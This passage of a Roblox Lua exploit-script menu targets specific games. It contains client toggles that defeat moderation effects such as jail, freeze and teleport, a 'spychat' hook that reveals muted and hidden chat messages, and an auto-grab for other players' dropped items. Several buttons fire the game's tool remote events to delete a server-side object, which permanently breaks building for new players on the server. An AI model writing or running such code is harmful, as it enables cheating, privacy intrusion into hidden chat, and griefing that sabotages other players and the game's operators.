					local root = character:FindFirstChild("HumanoidRootPart")
					if not root then return end
	
					if not lastPosition then
						lastPosition = root.Position
						lastOrientation = root.CFrame - root.Position
						hasTeleportedBack = false
						return
					end
	
					local currentPos = root.Position
	
					-- Check if X coordinate is 1234567 (glitch zone)
					if math.abs(currentPos.X - 1234567) < 5 and not hasTeleportedBack then
						-- Teleported to the glitch zone, send back with same rotation
						root.CFrame = CFrame.new(lastPosition) * lastOrientation
						hasTeleportedBack = true
						_G.Notify("Blocked glitch command!", 2)
					elseif math.abs(currentPos.X - 1234567) >= 5 then
						-- Not in the glitch zone anymore, reset flag and update position
						hasTeleportedBack = false
						lastPosition = currentPos
						lastOrientation = root.CFrame - root.Position
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiGlitchLoop then
					_G.AntiGlitchLoop:Disconnect()
					_G.AntiGlitchLoop = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- JAIL
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "jail",
		groupbox = script,
		tooltip = "Visually removes your jail cell.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local hasNotified = false
	
				_G.AntiJailLoop = RunService.Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
	
					local jail = char:FindFirstChild("Jail")
					if not jail then 
						hasNotified = false
						return 
					end
	
					-- Notify once when jail is detected
					if not hasNotified then
						_G.Notify("Blocked jail command!", 2)
						hasNotified = true
					end
	
					for _, part in pairs(jail:GetChildren()) do
						if part:IsA("BasePart") and part.Name == "Part" then
							part.CanCollide = false
							part.Transparency = 1
						end
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiJailLoop then
					_G.AntiJailLoop:Disconnect()
					_G.AntiJailLoop = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- MAPTIDE NAN
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "maptidenan",
		groupbox = script,
		tooltip = "Prevents spawn loop kill when a player sets the terrain tide to NaN.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
	
				local function isVoided()
					local spawn = workspace:FindFirstChild("Spawn")
					if not spawn then return false end
					local acm = spawn.AssemblyCenterOfMass
					return acm.X == 0 and acm.Y == -1000000 and acm.Z == 0
				end
	
				local function onCharacterAdded(character)
					local hrp = character:WaitForChild("HumanoidRootPart")
					if not isVoided() then return end
					hrp.Anchored = true
					task.wait(0.1)
					hrp.CFrame = CFrame.new(0, 3, 0)
					hrp.Anchored = false
	
					-- Notify when teleported
					_G.Notify("Blocked NaN spawn kill!", 2)
				end
	
				-- Connect to character respawn
				_G.AntiNanConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
	
				-- Also run for current character if it exists
				if LocalPlayer.Character then
					onCharacterAdded(LocalPlayer.Character)
				end
			else
				-- Disconnect when disabled
				if _G.AntiNanConnection then
					_G.AntiNanConnection:Disconnect()
					_G.AntiNanConnection = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- FREEZE
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "freeze",
		groupbox = script,
		tooltip = "Auto resets your character when you get frozen.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local isResetting = false
	
				_G.AntiFreezeLoop = RunService.Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
	
					if char:FindFirstChild("Hielo") and not isResetting then
						isResetting = true
						_G.Notify("Frozen detected! Resetting...", 2)
	
						if shared.ResetCharacter then
							shared.ResetCharacter()
						else
							-- Fallback reset method
							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
						end
	
						LocalPlayer.CharacterAdded:Wait()
						task.wait(0.2)
						isResetting = false
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiFreezeLoop then
					_G.AntiFreezeLoop:Disconnect()
					_G.AntiFreezeLoop = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- INVIS
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "invisible",
		groupbox = script,
		tooltip = "Auto resets your character when you turn invisible.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local isResetting = false
	
				_G.AntiInvisLoop = RunService.Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
	
					local upperTorso = char:FindFirstChild("UpperTorso")
					if upperTorso and upperTorso.Transparency >= 1 and not isResetting then
						isResetting = true
						_G.Notify("Invisible detected! Resetting...", 2)
	
						if shared.ResetCharacter then
							shared.ResetCharacter()
						else
							-- Fallback reset method
							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
						end
	
						LocalPlayer.CharacterAdded:Wait()
						task.wait(0.2)
						isResetting = false
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiInvisLoop then
					_G.AntiInvisLoop:Disconnect()
					_G.AntiInvisLoop = nil
				end
			end
		end
	})
	
	
	-- ====================================================================================================
	-- MORPH
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "morph",
		groupbox = script,
		tooltip = "Auto resets your character when you get morphed.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local isResetting = false
				local canDetect = false
				local originalShirt = nil
				local originalPants = nil
				local originalAccessories = {}
	
				local function captureOriginalAppearance(character)
					-- Capture shirt
					local shirt = character:FindFirstChildOfClass("Shirt")
					originalShirt = shirt and shirt.ShirtTemplate or nil
					-- Capture pants
					local pants = character:FindFirstChildOfClass("Pants")
					originalPants = pants and pants.PantsTemplate or nil
					-- Capture accessories
					originalAccessories = {}
					for _, accessory in pairs(character:GetChildren()) do
						if accessory:IsA("Accessory") then
							table.insert(originalAccessories, accessory.Name)
						end
					end
				end
	
				local function checkForMorph(character)
					if isResetting or not canDetect then return end
					-- Check shirt change
					local shirt = character:FindFirstChildOfClass("Shirt")
					local currentShirt = shirt and shirt.ShirtTemplate or nil
					if currentShirt ~= originalShirt then
						return true
					end
					-- Check pants change
					local pants = character:FindFirstChildOfClass("Pants")
					local currentPants = pants and pants.PantsTemplate or nil
					if currentPants ~= originalPants then
						return true
					end
					-- Check accessories change
					local currentAccessories = {}
					for _, accessory in pairs(character:GetChildren()) do
						if accessory:IsA("Accessory") then
							table.insert(currentAccessories, accessory.Name)
						end
					end
					-- Compare accessories (if count or names changed)
					if #currentAccessories ~= #originalAccessories then
						return true
					end
					for _, accName in pairs(currentAccessories) do
						local found = false
						for _, origName in pairs(originalAccessories) do
							if accName == origName then
								found = true
								break
							end
						end
						if not found then
							return true
						end
					end
					return false
				end
	
				local function onCharacterAdded(character)
					canDetect = false -- Disable detection on respawn
					task.wait(0.5) -- Wait for character to fully load
					captureOriginalAppearance(character)
					task.wait(1) -- Wait 1 second before enabling detection
					canDetect = true
					isResetting = false
				end
	
				-- Capture initial appearance
				if LocalPlayer.Character then
					task.spawn(function()
						onCharacterAdded(LocalPlayer.Character)
					end)
				end
	
				-- Monitor for changes
				_G.AntiMorphLoop = game:GetService("RunService").Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
					if checkForMorph(char) then
						isResetting = true
						_G.Notify("Morph detected! Resetting...", 2)
						if shared.ResetCharacter then
							shared.ResetCharacter()
						else
							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
						end
						LocalPlayer.CharacterAdded:Wait()
						task.wait(0.2)
					end
				end)
	
				-- Track respawns
				_G.AntiMorphRespawn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
			else
				-- Stop the loop when disabled
				if _G.AntiMorphLoop then
					_G.AntiMorphLoop:Disconnect()
					_G.AntiMorphLoop = nil
				end
				if _G.AntiMorphRespawn then
					_G.AntiMorphRespawn:Disconnect()
					_G.AntiMorphRespawn = nil
				end
			end
		end
	})
	
	
	-- ====================================================================================================
	-- NOCLIP
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "noclip",
		groupbox = script,
		tooltip = "Auto joins on noclip.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local TeleportService = game:GetService("TeleportService")
				local hasDetected = false
	
				_G.AntiNoclipLoop = task.spawn(function()
					while true do
						local char = workspace:FindFirstChild(LocalPlayer.Name)
						if char then
							local hrp = char:FindFirstChild("HumanoidRootPart")
							if hrp and hrp.CollisionGroup == "NoClip" and not hasDetected then
								hasDetected = true
								_G.Notify("Noclip detected! Rejoining...", 999999)
								TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
							end
						end
						task.wait(5)
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiNoclipLoop then
					task.cancel(_G.AntiNoclipLoop)
					_G.AntiNoclipLoop = nil
				end
			end
		end
	})
	
	
	
	
	
	-- ====================================================================================================
	-- TP
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "teleport",
		groupbox = script,
		tooltip = "Prevents you from getting teleported.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local lastPosition = nil
				local lastOrientation = nil
	
				_G.AntiTeleportLoop = RunService.Heartbeat:Connect(function()
					local character = LocalPlayer.Character
					if not character then return end
					local root = character:FindFirstChild("HumanoidRootPart")
					if not root then return end
	
					if lastPosition then
						local distance = (root.Position - lastPosition).Magnitude
						if distance > 15 then
							-- Teleported, send back with same rotation
							root.CFrame = CFrame.new(lastPosition) * lastOrientation
							_G.Notify("Blocked teleport!", 2)
						end
					end
	
					lastPosition = root.Position
					lastOrientation = root.CFrame - root.Position
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiTeleportLoop then
					_G.AntiTeleportLoop:Disconnect()
					_G.AntiTeleportLoop = nil
				end
			end
		end
	})
end;
task.spawn(C_1c2);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.mainScriptTCO
local function C_255()
local script = G2L["255"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	-- ====================================================================================================
	-- SPYCHAT SETUP
	-- ====================================================================================================
	local TCO_PLACE_IDS = {
		11137575513,
		12943245078,
		12943247001,
		108097274488844,
	}
	
	local isTCO = false
	for _, id in ipairs(TCO_PLACE_IDS) do
		if game.PlaceId == id then
			isTCO = true
			break
		end
	end
	
	if isTCO then
		local isog = workspace:FindFirstChild("Cubes") ~= nil
	
		local namecolors = {
			peasant  = {150, 103, 102},
			arken    = {4,   175, 236},
			admin    = {245, 205, 48},
			hidden   = {255, 0,   0},
			iqgenius = {255, 179, 179},
			iqdumb   = {200, 0,   0},
		}
		if isog then
			namecolors.peasant = {128, 128, 128}
		end
	
		local namecolorshex = {}
		for i, v in pairs(namecolors) do
			namecolorshex[i] = "#" .. Color3.fromRGB(table.unpack(v)):ToHex()
		end
	
		-- Register handler
		_G.ChatHandlers = _G.ChatHandlers or {}
		table.insert(_G.ChatHandlers, function(mdata, plr)
			local spyChatOn = _G.ConfigData and _G.ConfigData["spychat"] or false
	
			local cn
			if plr.Neutral == true then
				if plr:GetAttribute("Arken") == true then
					cn = "arken"
				else
					cn = "peasant"
				end
			else
				cn = "admin"
			end
	
			local muted = plr:HasTag("Muted")
			if muted then
				cn = "hidden"
				if not spyChatOn then
					mdata.Text = ""
				end
			end
	
			local hidden = false
			if string.sub(mdata.Text, 1, 1) == ";" then
				if spyChatOn then
					cn = "hidden"
					hidden = true
				else
					mdata.Text = ""
				end
			end
	
			local iqEmoji = nil
			if spyChatOn and plr:GetAttribute("IQ") then
				local iq = plr:GetAttribute("IQ")
				if iq >= 200 then
					iqEmoji = "ðŸ§ "
					cn = "iqgenius"
				elseif iq <= 50 then
					iqEmoji = "ðŸ¤ª"
					cn = "iqdumb"
				end
			end
	
			local icon = ""
			if spyChatOn then
				if hidden then
					icon = "ðŸš« "
				elseif muted then
					icon = "ðŸ¤ "
				elseif iqEmoji then
					icon = iqEmoji .. " "
				end
			end
	
			local r   = namecolors[cn][1]
			local g   = namecolors[cn][2]
			local b   = namecolors[cn][3]
			local hex = namecolorshex[cn]
			local displayName = plr.DisplayName
	
			if isog then
				mdata.PrefixText = "<font color=\"" .. hex .. "\"><b><font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. icon .. "[" .. displayName .. "]: </font></b></font>"
			else
				mdata.PrefixText = "<font color=\"" .. hex .. "\"><i><font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. icon .. "(" .. displayName .. ") </font></i></font>"
			end
		end)
	end
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "spychat",
		groupbox = script,
		tooltip = "Shows all hidden chats.",
		callback = function(isEnabled)
		end
	})
	
	
	
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local pickupLoop = nil
	local unequipLoop = nil
	local autoPickedTools = {}
	local DEATH_TAG = "DeathItem"
	_G.CreateToggle({
		frame = "autograb",
		groupbox = script,
		tooltip = "Automatically grabs all dropped/disarmed items.",
		callback = function(isEnabled)
			if isEnabled then
				autoPickedTools = {}
				-- Pickup loop
				pickupLoop = task.spawn(function()
					while true do
						local char = LocalPlayer.Character
						local hum = char and char:FindFirstChildWhichIsA("Humanoid")
						if hum and hum.Health > 0 then
							local currentTool = char:FindFirstChildOfClass("Tool")
							for _, obj in ipairs(workspace:GetChildren()) do
								if obj:IsA("Tool") and obj:FindFirstChild("Handle") and not obj:HasTag(DEATH_TAG) and not autoPickedTools[obj] then
									autoPickedTools[obj] = tick() + 0.5
									local toolName = obj.Name
									pcall(function()
										hum:EquipTool(obj)
									end)
	
									-- Notify when tool is grabbed
									_G.Notify("Auto grabbed tool: " .. toolName, 2)
								end
							end
							if currentTool and currentTool.Parent == LocalPlayer.Backpack and not autoPickedTools[currentTool] then
								task.wait(0.05)
								hum:EquipTool(currentTool)
							end
						end
						task.wait()
					end
				end)
				-- Unequip loop
				unequipLoop = task.spawn(function()
					while true do
						local char = LocalPlayer.Character
						if char then
							local currentTime = tick()
							for tool, expiry in pairs(autoPickedTools) do
								if currentTime > expiry then
									autoPickedTools[tool] = nil
								end
							end
							for _, tool in pairs(char:GetChildren()) do
								if tool:IsA("Tool") and autoPickedTools[tool] and currentTime < autoPickedTools[tool] then
									tool.Parent = LocalPlayer.Backpack
								end
							end
						end
						task.wait()
					end
				end)
			else
				-- Disable
				if pickupLoop then
					task.cancel(pickupLoop)
					pickupLoop = nil
				end
				if unequipLoop then
					task.cancel(unequipLoop)
					unequipLoop = nil
				end
				autoPickedTools = {}
			end
		end
	})
	
	
	-- ====================================================================================================
	-- BUTTONS
	-- ====================================================================================================
	_G.CreateButton({
		frame = "disabledeletesound",
		groupbox = script,
		tooltip = "Temporarily disables building sounds using delete tool, respawning will restore the sounds.",
		afterMessage = "Disabled sounds!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("disabledeletesound", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local workspace = game:GetService("Workspace")
				local isog = workspace:FindFirstChild("Cubes") ~= nil
				if isog then
					error("OG not supported!")
				end
				local character = LocalPlayer.Character
				if not character then error("No character") end
	
				-- Refresh the delete tool first
				if shared.RefreshTool then
					shared.RefreshTool("Delete")
					task.wait(0.1)
				end
	
				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
				if not deleteTool then error("Delete tool needed!") end
	
				local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then error("No HumanoidRootPart") end
				local brick = hrp:FindFirstChild("Brick")
				if not brick then error("Brick not found in HumanoidRootPart") end
				for i = 1, 2 do
					event:FireServer(brick, hrp.Position)
					task.wait(0.01)
				end
			end)
			if success then
				_G.SetButtonText("disabledeletesound", "Disabled sounds!", 1)
				_G.Notify("Building sounds disabled!", 3)
				return true
			else
				_G.SetButtonText("disabledeletesound", err or "Failed!", 1)
				_G.Notify("Failed to disable sounds!", 3)
				return false
			end
		end,
	})
	-- ====================================================================================================
	-- DISABLE BKIT
	-- ====================================================================================================
	_G.CreateButton({
		frame = "disablebkit",
		groupbox = script,
		tooltip = "Disables B-Kit serversided using delete tool. New players who gets B-Kit will no longer be able to build.",
		needsConfirm = true,
		confirmMessage = "Are you sure?",
		confirmWait = 1,
		afterMessage = "Disabled B-Kit!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("disablebkit", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local character = LocalPlayer.Character
				if not character then error("No character") end
	
				-- Refresh the delete tool first
				if shared.RefreshTool then
					shared.RefreshTool("Delete")
					task.wait(0.1)
				end
	
				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
				if not deleteTool then error("Delete tool needed!") end
	
				local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
				local brick = rs:FindFirstChild("Brick")
				if not brick then error("No Brick in ReplicatedStorage") end
				local startTime = tick()
				local maxTime = 5
				while tick() - startTime < maxTime and not token.cancelled do
					if not rs:FindFirstChild("Brick") then
						return true
					end
					event:FireServer(brick, character.HumanoidRootPart.Position)
					task.wait(0.01)
				end
				error("Timeout - Brick not deleted")
			end)
			if success then
				_G.SetButtonText("disablebkit", "Disabled B-Kit!", 1)
				_G.Notify("B-Kit disabled successfully!", 3)
				return true
			else
				_G.SetButtonText("disablebkit", err or "Failed!", 1)
				_G.Notify("Failed to disable B-Kit!", 3)
				return false
			end
		end,
	})
	
	-- ====================================================================================================
	-- FIX BRICK
	-- ====================================================================================================
	_G.CreateButton({
		frame = "fixbrick",
		groupbox = script,
		tooltip = "Fixes/restores the brick, if someone painted it, to normal using paint tool. This does not fix broken B-Kit.",
		afterMessage = "Fixed brick!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("fixbrick", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local brick = rs:FindFirstChild("Brick")
				if not brick or brick:HasTag("FAKE") then
					error("Brick not found!")
				end
				local character = LocalPlayer.Character
				if not character then error("No character") end
				local paintTool = LocalPlayer.Backpack:FindFirstChild("Paint") or character:FindFirstChild("Paint")
				if not paintTool then error("Paint tool needed!") end
				if shared.RefreshTool then
					shared.RefreshTool("Paint")
					task.wait(0.1)
				end
				paintTool = LocalPlayer.Backpack:FindFirstChild("Paint") or character:FindFirstChild("Paint")
				if not paintTool then error("Paint tool not found") end
				local event = paintTool:WaitForChild("Script"):WaitForChild("Event")
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then error("No HumanoidRootPart") end
				local pos = hrp.Position
				event:FireServer(brick, Enum.NormalId.Top, pos, "both ðŸ¤", Color3.fromRGB(192, 192, 192), "plastic", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Bottom, pos, "both ðŸ¤", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Left, pos, "both ðŸ¤", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Right, pos, "both ðŸ¤", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Back, pos, "both ðŸ¤", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Front, pos, "both ðŸ¤", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Top, pos, "both ðŸ¤", Color3.fromRGB(192, 192, 192), "spray", "")
				if not brick.Anchored then
					task.wait(0.1)
					event:FireServer(brick, Enum.NormalId.Top, pos, "material", Color3.fromRGB(173, 172, 175), "anchor", "")
				end
				if not brick.CanCollide then
					task.wait(0.1)
					event:FireServer(brick, Enum.NormalId.Top, pos, "material", Color3.fromRGB(173, 172, 175), "collide", "")
				end
			end)
			if success then
				_G.SetButtonText("fixbrick", "Fixed brick!", 1)
				_G.Notify("Brick fixed successfully!", 3)
				return true
			else
				_G.SetButtonText("fixbrick", err or "Failed!", 1)
				_G.Notify("Failed to fix brick!", 3)
				return false
			end
		end,
	})
	
	-- ====================================================================================================
	-- RESTORE BRICK
	-- ====================================================================================================
	if getgenv().brickcollection == nil then
		getgenv().brickcollection = {}
	
		local brickname = "Brick"
		local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
	
		local function dbc(b)
			if b.Name ~= brickname then return end
			if not table.find(getgenv().brickcollection, b) then
				table.insert(getgenv().brickcollection, 1, b)
			end
		end
	
		if cfolder then
			cfolder.DescendantAdded:Connect(dbc)
			for _, v in pairs(cfolder:GetDescendants()) do
				dbc(v)
			end
		end
	end
	
	_G.CreateButton({
		frame = "restorebrick",
		groupbox = script,
		tooltip = "Restores brick and sometimes places a block at your torso when B-Kit is broken, and theres no more blocks to place on. You must be in the server before B-Kit gets disabled.",
		afterMessage = "Restored brick!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("restorebrick", "Processing...", 999)
	
			if getgenv().brickcollection == nil then
				getgenv().brickcollection = {}
			end
	
			local success, result = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local workspace = game:GetService("Workspace")
	
				local brickname = "Brick"
				local ws = 0.235
				local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
	
				if not cfolder then
					return "No blocks folder!"
				end
	
				local character = LocalPlayer.Character
				if not character then return "No character!" end
	
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then return "No HumanoidRootPart!" end
	
				local function getplrpos()
					return hrp.Position
				end
	
				local function findtool(toolname)
					for _, v in pairs(character:GetChildren()) do
						if v:IsA("Tool") and v.Name:find(toolname) then
							return v
						end
					end
					for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
						if v:IsA("Tool") and v.Name:find(toolname) then
							return v
						end
					end
					return nil
				end
	
				if not rs:FindFirstChild(brickname) then
					local brick = Instance.new("Part")
					brick.Name = brickname
					brick.Parent = rs
				end
	
				for _, v in pairs(character:GetChildren()) do
					if v:HasTag("The Chosen One by TomazDev") then
						v.Script.Enabled = false
						v.Script.Enabled = true
					end
				end
	
				for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
					if v:HasTag("The Chosen One by TomazDev") then
						v.Script.Enabled = false
						v.Script.Enabled = true
					end
				end
	
				local buildtool = findtool("Build")
				local painttool = findtool("Paint")
				local shapetool = findtool("Shape")
	
				if not buildtool then
					return "Build tool needed!"
				end
	
				if buildtool.Parent == LocalPlayer.Backpack then
					buildtool.Parent = character
				end
				if painttool and painttool.Parent == LocalPlayer.Backpack then
					painttool.Parent = character
				end
				if shapetool and shapetool.Parent == LocalPlayer.Backpack then
					shapetool.Parent = character
				end
	
				task.wait(ws)
	
				local currbc = {}
				for _, v in pairs(getgenv().brickcollection) do
					if v ~= nil and typeof(v) == "Instance" then
						if v:GetFullName() ~= brickname and v.Name ~= "Debris" then
							table.insert(currbc, 1, v)
						else
							table.insert(currbc, v)
						end
					end
				end
	
				if #currbc == 0 then
					return "No blocks found!"
				end
	
				local playerfolder = cfolder:FindFirstChild(LocalPlayer.Name)
				if not playerfolder then
					return "Player folder not found!"
				end
	
				local block = nil
				local beforeamt = #playerfolder:GetChildren()
	
				for _, v in pairs(currbc) do
					if v ~= nil and typeof(v) == "Instance" then
						block = v
						if buildtool:FindFirstChild("Script") and buildtool.Script:FindFirstChild("Event") then
							buildtool.Script.Event:FireServer(
								block,
								Enum.NormalId.Top,
								getplrpos(),
								"detailed"
							)
						end
	
						task.wait(ws)
						if beforeamt < #playerfolder:GetChildren() then
							break
						end
					end
				end
	
				task.wait(1)
				block = playerfolder:FindFirstChildWhichIsA("BasePart")
	
				if not block then
					return "No block created!"
				end
	
				block = playerfolder:GetChildren()[#playerfolder:GetChildren()]
	
				if painttool then
					if block.Material ~= Enum.Material.Plastic then
						painttool.Script.Event:FireServer(
							block,
							Enum.NormalId.Top,
							getplrpos(),
							"material",
							Color3.fromRGB(192, 192, 192),
							"plastic",
							""
						)
						task.wait(ws * 2)
					end
	
					if not block.Anchored or block.CFrame - block.Position ~= CFrame.new() then
						local l = tick()
						repeat
							if tick() > l then
								l = tick() + (ws * 2)
								painttool.Script.Event:FireServer(
									block,
									Enum.NormalId.Top,
									getplrpos(),
									"both ðŸ¤",
									Color3.fromRGB(192, 192, 192),
									"anchor",
									""
								)
							end
							task.wait()
						until block.Anchored and block.CFrame - block.Position == CFrame.new()
					end
				end
	
				if shapetool then
					local blockpos = block.Position
					blockpos = Vector3.new(blockpos.X % 4, blockpos.Y % 4, blockpos.Z % 4)
					blockpos = blockpos - Vector3.new(0.5, 0.5, 0.5)
	
					for i = 1, blockpos.X do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Left, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, 3 - blockpos.X do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Right, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, blockpos.Y do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Bottom, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, 3 - blockpos.Y do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Top, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, blockpos.Z do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Front, block.Position, "increase")
						task.wait(0.15)
					end
	
					for i = 1, 3 - blockpos.Z do
						shapetool.Script.Event:FireServer(block, Enum.NormalId.Back, block.Position, "increase")
						task.wait(0.15)
					end
				end
	
				return true
			end)
	
			if success and result == true then
				_G.SetButtonText("restorebrick", "Restored brick!", 1)
				return true
			elseif type(result) == "string" then
				_G.SetButtonText("restorebrick", result, 1)
				return false
			else
				_G.SetButtonText("restorebrick", "Failed!", 1)
				return false
			end
		end,
	})
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- DISABLE BKIT OG
	-- ====================================================================================================
	_G.CreateButton({
		frame = "disablebkitog",
		groupbox = script,
		tooltip = "Disables B-Kit serversided in OG servers using delete tool. New players who gets B-Kit will no longer be able to build.",
		needsConfirm = true,
		confirmMessage = "Are you sure?",
		confirmWait = 1,
		afterMessage = "Disabled B-Kit!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("disablebkitog", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local character = LocalPlayer.Character
				if not character then error("No character") end
	
				-- Refresh the delete tool first
				if shared.RefreshTool then
					shared.RefreshTool("Delete")
					task.wait(0.1)
				end
	
				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
				if not deleteTool then error("Delete tool needed!") end
	
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then error("No HumanoidRootPart") end
				local cube = rs:FindFirstChild("Cube")
				if not cube then error("No Cube in ReplicatedStorage") end
				local events = LocalPlayer.Backpack:FindFirstChild("Events")
				if not events then error("No Events in Backpack") end
				local startTime = tick()
				local maxTime = 5
				while tick() - startTime < maxTime and not token.cancelled do
					if not rs:FindFirstChild("Cube") then
						return true
					end
					events:FireServer(hrp.Position, Enum.NormalId.Top, cube, Color3.new(), "Smooth")
					task.wait(0.01)
				end
				error("Timeout - Cube not deleted")
			end)
			if success then
				_G.SetButtonText("disablebkitog", "Disabled B-Kit!", 1)
				_G.Notify("B-Kit disabled successfully!", 3)
				return true
			else
				_G.SetButtonText("disablebkitog", err or "Failed!", 1)
				_G.Notify("Failed to disable B-Kit!", 3)
				return false
			end
		end,
	})
end;
task.spawn(C_255);
